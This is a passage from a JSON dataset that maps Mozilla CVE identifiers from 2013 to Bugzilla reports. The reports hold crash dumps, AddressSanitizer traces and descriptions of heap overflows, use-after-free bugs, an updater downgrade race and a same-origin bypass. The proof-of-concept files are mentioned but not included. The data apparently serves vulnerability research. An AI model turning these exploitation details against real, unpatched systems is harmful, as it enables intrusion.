break; The count variable is directly controlled from javascript with no validation performed by the ANGLE library. Context::drawLineLoop proceeds to request a buffer using the overflowed spaceNeeded variable as the size, and fill the insufficiently allocated memory with data resulting in a heap overflow condition. Example crash information from Firefox 22.0: (1788.17d4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=06723000 ebx=7fffffff ecx=00218800 edx=0057d160 esi=0286a368 edi=00000000 eip=69075035 esp=0057d174 ebp=0057d188 iopl=0 nv up ei ng nz ac po cy cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210293 libGLESv2!gl::Context::drawLineLoop+0x123: 69075035 890c88 mov dword ptr [eax+ecx*4],ecx ds:002b:06f85000=???????? ChildEBP RetAddr Args to Child 0057d188 69074d23 00000000 00000000 00000000 libGLESv2!gl::Context::drawLineLoop+0x123 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\gfx\\angle\\src\\libglesv2\\context.cpp @ 3250] 0057d1b4 6907a5c7 00000002 00000000 7fffffff libGLESv2!gl::Context::drawArrays+0xee [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\gfx\\angle\\src\\libglesv2\\context.cpp @ 3105] 0057d1ec 61c2d9a2 00000002 00000000 7fffffff libGLESv2!glDrawArrays+0x4d [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\gfx\\angle\\src\\libglesv2\\libglesv2.cpp @ 16707566] 0057d200 62026f18 0fae7400 00000002 00000000 xul!mozilla::gl::GLContext::fDrawArrays+0x17 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\dist\\include\\glcontext.h @ 685] 0057d238 62029022 0bf4a6a0 00000002 00000000 xul!mozilla::WebGLContext::DrawArrays+0x123 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\content\\canvas\\src\\webglcontextgl.cpp @ 1472] 0057d25c 61e59774 0c064600 0057d29c 0bf4a6a0 xul!mozilla::dom::WebGLRenderingContextBinding::drawArrays+0x83 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\dom\\bindings\\webglrenderingcontextbinding.cpp @ 5502] 0057d28c 6a9f9515 0c064600 00000003 057d4190 xul!mozilla::dom::WebGLRenderingContextBinding::genericMethod+0xcd [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\dom\\bindings\\webglrenderingcontextbinding.cpp @ 10325] 0057d2e8 6a9e75ea 0c064600 00000000 04ca0070 mozjs!js::InvokeKernel+0x115 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\js\\src\\jsinterp.cpp @ 390] In addition to the above issue, a bug in the NVIDIA graphics driver (version information in gfx_driver_version.txt) and insufficient validation of the size of allocated memory returned by a call to IDirect3DDevice9::CreateIndexBuffer in StreamingIndexBuffer::reserveSpace (libGLESv2/IndexDataManager.cpp) can also trigger a similar heap overflow condition. With the buggy NVIDIA driver, calls to IDirect3DDevice9::CreateIndexBuffer with large memory sizes (e.g. 0xFFFF0004) fail to allocate the requested amount of memory, but return a success result (HRESULT 0). Subsequent code in StreamingIndexBuffer::reserveSpace does not check the size of memory allocated before returning the buffer to the Context::drawLineLoop function (libGLESv2/Context.cpp) to be used. Context::drawLineLoop proceeds to fill the insufficiently allocated memory with data, assuming a successful memory allocation, resulting in a heap overflow condition: Example crash information from Friefox 22.0: (15b8.2280): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=06756000 ebx=3fffc000 ecx=001c2c00 edx=004ed6a0 esi=02afa9f0 edi=00000000 eip=690c5035 esp=004ed6b4 ebp=004ed6c8 iopl=0 nv up ei ng nz na pe cy cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210287 libGLESv2!gl::Context::drawLineLoop+0x123: 690c5035 890c88 mov dword ptr [eax+ecx*4],ecx ds:002b:06e61000=???????? ChildEBP RetAddr Args to Child 004ed6c8 690c4d23 00000000 00000000 00000000 libGLESv2!gl::Context::drawLineLoop+0x123 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\gfx\\angle\\src\\libglesv2\\context.cpp @ 3250] 004ed6f4 690ca5c7 00000002 00000000 3fffc000 libGLESv2!gl::Context::drawArrays+0xee [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\gfx\\angle\\src\\libglesv2\\context.cpp @ 3105] 004ed72c 61c2d9a2 00000002 00000000 3fffc000 libGLESv2!glDrawArrays+0x4d [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\gfx\\angle\\src\\libglesv2\\libglesv2.cpp @ 16707566] 004ed740 62026f18 0c069400 00000002 00000000 xul!mozilla::gl::GLContext::fDrawArrays+0x17 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\dist\\include\\glcontext.h @ 685] 004ed778 62029022 0c1474f0 00000002 00000000 xul!mozilla::WebGLContext::DrawArrays+0x123 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\content\\canvas\\src\\webglcontextgl.cpp @ 1472] 004ed79c 61e59774 0c264600 004ed7dc 0c1474f0 xul!mozilla::dom::WebGLRenderingContextBinding::drawArrays+0x83 [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\dom\\bindings\\webglrenderingcontextbinding.cpp @ 5502] 004ed7cc 6aa19515 0c264600 00000003 0552b2b0 xul!mozilla::dom::WebGLRenderingContextBinding::genericMethod+0xcd [e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\obj-firefox\\dom\\bindings\\webglrenderingcontextbinding.cpp @ 10325] Proof of Concept: ----------------- Enclosed in the zip file is a HTML file which triggers the interger overflow and subsequent heap corruption on affected browser versions on Windows systems. * Expected Result of running angle_crash.html = No crash * Actual Result of running angle_crash.html = Access violation - code c0000005 with heap corrupted"
      }
    ],
    "CVE-2013-1722": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=893308",
        "title": "Heap-use-after-free in nsAnimationManager::BuildAnimations",
        "description": "Need to install fuzzPriv extension [https://www.squarefree.com/extensions/domFuzzLite3.xpi]. Usually reproduces in one try, but do try with reload if it does not. ==1210==ERROR: AddressSanitizer: heap-use-after-free on address 0x61900d449420 at pc 0x7f183c1696ee bp 0x7fff6f500cd0 sp 0x7fff6f500cc8 READ of size 8 at 0x61900d449420 thread T0 #0 0x7f183c1696ed in nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyElements<nsISupports*> >::Length() const ../../../../dist/include/nsTArray.h:371 #1 0x7f183c1695d1 in nsCOMArray_base::Count() const ../../../../dist/include/nsCOMArray.h:95 #2 0x7f18448ee188 in mozilla::css::GroupRule::StyleRuleCount() const ../../dist/include/mozilla/css/GroupRule.h:54 #3 0x7f18448e8895 in nsAnimationManager::BuildAnimations(nsStyleContext*, nsTArray<ElementAnimation>&) layout/style/nsAnimationManager.cpp:783 #4 0x7f18448e4f78 in nsAnimationManager::CheckAnimationRule(nsStyleContext*, mozilla::dom::Element*) layout/style/nsAnimationManager.cpp:568 #5 0x7f1844e8b9ba in nsStyleSet::GetContext(nsStyleContext*, nsRuleNode*, nsRuleNode*, nsIAtom*, nsCSSPseudoElements::Type, mozilla::dom::Element*, unsigned int) layout/style/nsStyleSet.cpp:833 #6 0x7f1844e9496a in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) layout/style/nsStyleSet.cpp:1205 #7 0x7f1843daf486 in nsFrameManager::ReResolveStyleContext(nsPresContext*, nsIFrame*, nsIContent*, nsStyleChangeList*, nsChangeHint, nsChangeHint, nsRestyleHint, mozilla::css::RestyleTracker&, nsFrameManager::DesiredA11yNotifications, nsTArray<nsIContent*>&, TreeMatchContext&) layout/base/nsFrameManager.cpp:1256 #8 0x7f1843db79d9 in nsFrameManager::ComputeStyleChangeFor(nsIFrame*, nsStyleChangeList*, nsChangeHint, mozilla::css::RestyleTracker&, bool) layout/base/nsFrameManager.cpp:1695 #9 0x7f1843a81991 in nsCSSFrameConstructor::RestyleElement(mozilla::dom::Element*, nsIFrame*, nsChangeHint, mozilla::css::RestyleTracker&, bool) layout/base/nsCSSFrameConstructor.cpp:8340 #10 0x7f18439d12d2 in mozilla::css::RestyleTracker::ProcessOneRestyle(mozilla::dom::Element*, nsRestyleHint, nsChangeHint) layout/base/RestyleTracker.cpp:122 #11 0x7f18439ccf11 in mozilla::css::RestyleTracker::DoProcessRestyles() layout/base/RestyleTracker.cpp:209 #12 0x7f1843aa6a06 in mozilla::css::RestyleTracker::ProcessRestyles() layout/base/RestyleTracker.h:217 #13 0x7f1843aa6397 in nsCSSFrameConstructor::ProcessPendingRestyles() layout/base/nsCSSFrameConstructor.cpp:12071 #14 0x7f1843f384cc in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) layout/base/nsPresShell.cpp:3858 #15 0x7f1843f37087 in PresShell::FlushPendingNotifications(mozFlushType) layout/base/nsPresShell.cpp:3743 #16 0x7f1845a8456e in nsDocument::FlushPendingNotifications(mozFlushType) content/base/src/nsDocument.cpp:7085 #17 0x7f184b9d1391 in nsDocLoader::DocLoaderIsEmpty(bool) uriloader/base/nsDocLoader.cpp:709 #18 0x7f184b9d5b2b in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) uriloader/base/nsDocLoader.cpp:639 #19 0x7f184b9d71ea in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) uriloader/base/nsDocLoader.cpp:643 #20 0x7f1841e32480 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) netwerk/base/src/nsLoadGroup.cpp:684 #21 0x7f1845a98575 in nsDocument::DoUnblockOnload() content/base/src/nsDocument.cpp:7965 #22 0x7f1845a97fcb in nsDocument::UnblockOnload(bool) content/base/src/nsDocument.cpp:7893 #23 0x7f1845a3b713 in nsDocument::DispatchContentLoadedEvents() content/base/src/nsDocument.cpp:4680 #24 0x7f1845b52b1a in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() ../../../dist/include/nsThreadUtils.h:350 #25 0x7f18416e2feb in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:621 #26 0x7f18412fdd22 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #27 0x7f183cffea89 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:81 #28 0x7f1841aa3bfb in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:219 #29 0x7f1841aa3a4e in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:212 #30 0x7f1841aa3939 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:186 #31 0x7f184d36ce1e in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #32 0x7f184bf10ae0 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:269 #33 0x7f183c115aeb in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3853 #34 0x7f183c11a89d in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3921 #35 0x7f183c11d4d5 in XRE_main toolkit/xre/nsAppRunner.cpp:4123 #36 0x42a0d7 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:272 #37 0x4270e1 in main browser/app/nsBrowserApp.cpp:632 #38 0x7f18602ad76c in #39 0x426854 in _start 0x61900d449420 is located 32 bytes inside of 72-byte region [0x61900d449400,0x61900d449448) freed by thread T0 here: #0 0x41a5f2 in __interceptor_free #1 0x7f185e2096de in moz_free memory/mozalloc/mozalloc.cpp:48 #2 0x7f1844aec3b9 in operator delete(void*) ../../dist/include/mozilla/mozalloc.h:225 #3 0x7f1844aec3b9 in nsCSSKeyframesRule::~nsCSSKeyframesRule() layout/style/nsCSSRules.cpp:2454 #4 0x7f1844ab7122 in mozilla::css::GroupRule::DeleteCycleCollectable() layout/style/nsCSSRules.cpp:568 #5 0x7f1844b14928 in mozilla::css::GroupRule::cycleCollection::DeleteCycleCollectableImpl(void*) ../../dist/include/mozilla/css/GroupRule.h:39 #6 0x7f18417aad7f in SnowWhiteKiller::~SnowWhiteKiller() xpcom/base/nsCycleCollector.cpp:2173 #7 0x7f184176837e in SnowWhiteKiller::~SnowWhiteKiller() xpcom/base/nsCycleCollector.cpp:2168 #8 0x7f184175c525 in nsCycleCollector::FreeSnowWhite(bool) xpcom/base/nsCycleCollector.cpp:2280 #9 0x7f184175a984 in nsCycleCollectorRunner::Collect(ccType, nsCycleCollectorResults*, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:1171 #10 0x7f1841773500 in nsCycleCollector::Collect(ccType, nsCycleCollectorResults*, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:2883 #11 0x7f184177a715 in nsCycleCollector_collect(bool, nsCycleCollectorResults*, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3312 #12 0x7f1848a0fae2 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int, bool) dom/base/nsJSEnvironment.cpp:2566 #13 0x7f184873af46 in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) dom/base/nsDOMWindowUtils.cpp:1203 #14 0x7f1841838bbb in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #15 0x7f184b4caa70 in CallMethodHelper::Invoke() js/xpconnect/src/XPCWrappedNative.cpp:2795 #16 0x7f184b4caa70 in CallMethodHelper::Call() js/xpconnect/src/XPCWrappedNative.cpp:2133 #17 0x7f184b4caa70 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:2099 #18 0x7f184b5231df in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1315 #19 0x7f1854cc4acc in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:225 #20 0x7f1854cc4acc in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:478 #21 0x7f1854ca3c90 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2503 #22 0x7f1854c525d6 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:435 #23 0x7f1854cc5157 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:497 #24 0x7f1854cc9013 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:528 #25 0x7f1855e25d13 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:451 #26 0x7f185617e722 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jswrapper.cpp:446 #27 0x7f1855e9400e in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2633 #28 0x7f1855eb16ca in proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3205 #29 0x7f1854cc43dc in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:225 #30 0x7f1854cc43dc in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:471 #31 0x7f1854ca3c90 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2503 #32 0x7f1854c525d6 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:435 #33 0x7f1854cc5157 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:497 #34 0x7f1854cc9013 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:528 previously allocated by thread T0 here: #0 0x41a6d2 in malloc #1 0x7f185e209825 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 #2 0x7f18449ee3f3 in operator new(unsigned long) ../../dist/include/mozilla/mozalloc.h:201 #3 0x7f18449ee3f3 in (anonymous namespace)::CSSParserImpl::ParseKeyframesRule(void (*)(mozilla::css::Rule*, void*), void*) layout/style/nsCSSParser.cpp:2624 #4 0x7f18449e59ef in (anonymous namespace)::CSSParserImpl::ParseAtRule(void (*)(mozilla::css::Rule*, void*), void*, bool) layout/style/nsCSSParser.cpp:1673 #5 0x7f184492dd6e in (anonymous namespace)::CSSParserImpl::ParseSheet(nsAString_internal const&, nsIURI*, nsIURI*, nsIPrincipal*, unsigned int, bool) layout/style/nsCSSParser.cpp:988 #6 0x7f184492cdcf in nsCSSParser::ParseSheet(nsAString_internal const&, nsIURI*, nsIURI*, nsIPrincipal*, unsigned int, bool) layout/style/nsCSSParser.cpp:10870 #7 0x7f184485ef6c in mozilla::css::Loader::ParseSheet(nsAString_internal const&, mozilla::css::SheetLoadData*, bool&) layout/style/Loader.cpp:1628 #8 0x7f184485cc97 in mozilla::css::SheetLoadData::OnStreamComplete(nsIUnicharStreamLoader*, nsISupports*, tag_nsresult, nsAString_internal const&) layout/style/Loader.cpp:938 #9 0x7f184485f8fb in non-virtual thunk to mozilla::css::SheetLoadData::OnStreamComplete(nsIUnicharStreamLoader*, nsISupports*, tag_nsresult, nsAString_internal const&) layout/style/Loader.cpp:941 #10 0x7f184203714e in nsUnicharStreamLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) netwerk/base/src/nsUnicharStreamLoader.cpp:99 #11 0x7f1841d57c17 in nsBaseChannel::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) netwerk/base/src/nsBaseChannel.cpp:737 #12 0x7f1841d5810a in non-virtual thunk to nsBaseChannel::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) netwerk/base/src/nsBaseChannel.cpp:752 #13 0x7f1841e1e61c in nsInputStreamPump::OnStateStop() netwerk/base/src/nsInputStreamPump.cpp:623 #14 0x7f1841e1ae7c in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) netwerk/base/src/nsInputStreamPump.cpp:395 #15 0x7f1841e1eaa2 in non-virtual thunk to nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) netwerk/base/src/nsInputStreamPump.cpp:439 #16 0x7f18415bfcdc in nsInputStreamReadyEvent::Run() xpcom/io/nsStreamUtils.cpp:82 #17 0x7f18416e2feb in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:621 #18 0x7f18412fdd22 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #19 0x7f183cffea89 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:81 #20 0x7f1841aa3bfb in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:219 #21 0x7f1841aa3a4e in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:212 #22 0x7f1841aa3939 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:186 #23 0x7f184d36ce1e in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #24 0x7f184bf10ae0 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:269 #25 0x7f183c115aeb in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3853 #26 0x7f183c11a89d in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3921 #27 0x7f183c11d4d5 in XRE_main toolkit/xre/nsAppRunner.cpp:4123 #28 0x42a0d7 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:272 #29 0x4270e1 in main browser/app/nsBrowserApp.cpp:632 #30 0x7f18602ad76c in Shadow bytes around the buggy address: 0x0c3281a81230: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a81240: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a81250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a81260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a81270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c3281a81280: fd fd fd fd[fd]fd fd fd fd fa fa fa fa fa fa fa 0x0c3281a81290: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a812a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a812b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a812c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3281a812d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap righ redzone: fb Freed Heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==1210==ABORTING"
      }
    ],
    "CVE-2013-1723": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=891292",
        "title": "NativeKey should not continue handling key message if widget is destroyed after dispatching event",
        "description": "I realized that widget::NativeKey doesn't stop handling key message even if widget is destroyed by dispatching key event. I'm not sure the risk of this bug, though."
      }
    ],
    "CVE-2013-1724": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=894137",
        "title": "Heap-use-after-free in mozilla::dom::HTMLFormElement::IsDefaultSubmitElement",
        "description": "ASAN reports a use-after-free in mozilla::dom::HTMLFormElement::IsDefaultSubmitElement when the attached repro is opened. It seems to trigger when a gc() happens, so it might take a few seconds to crash."
      }
    ],
    "CVE-2013-1725": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=876762",
        "title": "ABORT: bad scope for new JSObjects: 'js::IsObjectInContextCompartment(lccx.GetScopeForNewJSObjects(), cx)' under ReparentWrapper / document.open",
        "description": "STR: 1. Paste the following into the live dom viewer <iframe src=about:blank></iframe> ...<script> onload = function() { document.open() } </script> 2. Type something random on the empty line"
      }
    ],
    "CVE-2013-1726": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=890853",
        "title": "MAR signature bypass in Updater could lead to downgrade",
        "description": "The updater doesn't write-lock the user-supplied MAR file while it is using it. This leads to a race condition between the MAR file's signatures being validated and the actual access of data within the file. If an attacker can change the file after the MAR signatures are validated, but before data is read, the attacker supplied MAR data will be what the updater uses. The proof-of-concept uses this to replace the version string which allows us to downgrade Firefox to a vulnerable version (at which point an attacker could use a previous vulnerability such as #888314 to execute arbitrary code). I'd imagine with further investigation into the MAR file format an attacker could feasibly have the updater extract and run their own files as part of the update process as well. This all runs as the SYSTEM user. Proof-of-concept is attached. It expects the current directory to hold an update.original.mar file (tested with http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/20.0/update/win32/en-GB/firefox-20.0.complete.mar), which it will use to downgrade the Firefox installation in c:\\Program Files (x86)\\Mozilla Firefox\\. As with race conditions, timing can be a little finicky. On my PC (Win7 x64, updater.exe 22.0.0.4917) I find there's a 200ms window between ~250-450ms. Given no arguments, the PoC will start at 200ms and work its way up to 1000ms in 10ms increments until it succeeds."
      }
    ],
    "CVE-2013-1727": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=782581",
        "title": "Subverting Same-Origin Policy for Local Contents by Symbolic Link",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1 Build ID: 20120713134347 Steps to reproduce: I created an example of malicious Android app that steals Firefox's private files such as a file storing Cookie. (Please see the attached file.) Actual results: The malicious app gained access to Firefox's private files. (Please see the attached file.) Expected results: The access should have been prohibited. (Please see the attached file.)"
      }
    ],
    "CVE-2013-1728": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=883686",
        "title": "valgrind errors in JS testsuite (\"conditional jumps on uninitialized data\")",
        "description": "I happened to run js/src/tests/jstests.py in valgrind mode and found two unique errors, which I have confirmed. I don't yet know the scope of the problems. I believe both are relatively easy to fix. First, the variable gotLambda in js/src/ion/IonBuilder.cpp is being used uninitialized. It is declared without an initializer, and the statement which would assign to it is inside an if statement and is not always executed. Several uses of gotLambda follow. This can probably be fixed by just initializing the gotLambda variable up front. Second, js1_5/extensions/regress-341956-01.js and js1_2/Array/splice1.js see conditional jumps on uninitialized data. It appears a block gets created by js/src/ion/IonBuilder.cpp (inlineBlock) which is later discarded (\"Natives may veto inlining\"), but it still has a resume point which has a use of a value in a block that is not discarded. When range analysis walks def-use graphs, it finds this use and wanders into the discarded block, which has an uninitialized domIndex_ field. This can probably be fixed by clearing out the resume points of the block when it is discarded."
      }
    ],
    "CVE-2013-1729": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=879656",
        "title": "Texture in Inspector's 3D View showing parts of the OS and other applications",
        "description": "STR: 1. Go to http://creativityblueprints.ro/#/home 2. Open Inspector 3. Select the HTML node 4. Open Tilt (click on the little cube on the right) Results: The webpage mesh has a texture applied that contains parts of the desktop, my dock and the markup panel. In other scenarios, the texture only contains large of black and white. Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20130603 Firefox/24.0 (today's Nightly)"
      }
    ],
    "CVE-2013-1730": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=851353",
        "title": "compartment mismatch in nsXBLBinding::DoInitJSClass",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1 Build ID: 20120713224749 Steps to reproduce: please see the attachments"
      }
    ],
    "CVE-2013-1731": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=899702",
        "title": "Android looks for egltrace.so in public directory",
        "description": "On Android, we optionally load \"egltrace.so\" to load GL tracing functionality. However, we do that unconditionally, and do it from a location that may be world-writable (\"/data/local\"). This opens up the possibility of a malicious third-party app dropping an egltrace.so in /data/local, which would then allow it full access to the Firefox app's data. Very little permissions (and nothing unusual) are needed to allow an app to write to /data/local."
      }
    ],
    "CVE-2013-1732": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=883514",
        "title": "Global buffer overflow (read 4) at nsFloatManager::GetFlowArea() with multicol, list, floats",
        "description": "Opening several of the attached page at once causes ASan to spot a global buffer overflow in current aurora- and beta asan builds, most of the time. The read is aligned and pretty far away from adjecent objects, so filing as a potential security issue since it's not obvious we're always reading something fixed, like padding bytes, with fixed outcome. The original even larger testcase needed just two of them to trigger this reliably. The attached somewhat reduced page still hits this most of the time. Let me know if you have trouble reproducing, because this could be related to machine speed etc. $ opt/firefox-aurora-asan/firefox ff-gbof-getflowarea.html{,,,,,,,,,,,,,,} 2>&1 | symbolize | c++filt ================================================================= ==14198== ERROR: AddressSanitizer global-buffer-overflow on address 0x7ff38e6b69a0 at pc 0x7ff386ed8bb1 bp 0x7fff9afa6740 sp 0x7fff9afa6738 READ of size 4 at 0x7ff38e6b69a0 thread T0 #0 0x7ff386ed8bb0 in nsFloatManager::GetFlowArea(int, nsFloatManager::BandInfoType, int, nsRect, nsFloatManager::SavedState*) const /home/aki/src/mozilla-aurora/layout/generic/nsFloatManager.cpp:140 0x7ff38e6b69a0 is located 32 bytes to the left of global variable 'mozilla::sse_private::sse3_enabled (/home/aki/src/mozilla-aurora/objdir-ff-asan/xpcom/build/SSE.cpp)' (0x7ff38e6b69c0) of size 1 0x7ff38e6b69a0 is located 24 bytes to the right of global variable 'nsTArrayHeader::sEmptyHdr (/home/aki/src/mozilla-aurora/objdir-ff-asan/xpcom/build/nsTArray.cpp)' (0x7ff38e6b6980) of size 8 'nsTArrayHeader::sEmptyHdr (/home/aki/src/mozilla-aurora/objdir-ff-asan/xpcom/build/nsTArray.cpp)' is ascii string '' Shadow byte and word: 0x1ffe71cd6d34: f9 0x1ffe71cd6d30: 00 f9 f9 f9 f9 f9 f9 f9 More shadow bytes: 0x1ffe71cd6d10: 04 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d18: 01 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d20: 04 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d28: 00 00 00 f9 f9 f9 f9 f9 =>0x1ffe71cd6d30: 00 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d38: 01 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d40: 01 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d48: 01 f9 f9 f9 f9 f9 f9 f9 0x1ffe71cd6d50: 01 f9 f9 f9 f9 f9 f9 f9 Stats: 150M malloced (212M for red zones) by 600810 calls Stats: 12M realloced by 34962 calls Stats: 102M freed by 265916 calls Stats: 0M really freed by 0 calls Stats: 400M (102447 full pages) mmaped in 100 calls mmaps by size class: 8:524256; 9:57337; 10:24570; 11:16376; 12:4096; 13:4096; 14:1280; 15:512; 16:1152; 17:128; 18:32; 19:8; 20:4; 